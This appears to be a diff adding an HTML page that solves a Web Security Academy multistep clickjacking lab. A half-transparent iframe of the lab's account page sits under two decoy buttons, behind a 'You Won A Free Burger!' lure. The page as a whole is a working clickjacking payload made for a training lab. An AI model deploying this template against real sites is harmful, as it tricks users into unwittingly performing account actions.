@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Won A Free Burger!</title>
+    <style>
+        #target_site {
+            position: relative;
+            height: 500px;
+            width: 500px;
+            opacity: 0.5;
+            z-index: 1;
+        }
+
+        #decoy_site_1 {
+            position: absolute;
+            color:red;
+            top: 490px;
+            left: 10px;
+        }
+
+        #decoy_site_2 {
+            position: absolute;
+            color: blue;
+            top: 295px;
+            left: 200px;
+        }
+    </style>
+</head>
+<body>
+    <div id="decoy_site_1">
+        <button>Click Here First!</button>
+    </div>
+    <div id="decoy_site_2">
+        <button>Click Here Next!</button>
+    </div>
+    <iframe id="target_site" src="https://[LAB_SUB_DOMAIN].web-security-academy.net/my-account"></iframe>
+</body>
+</html>
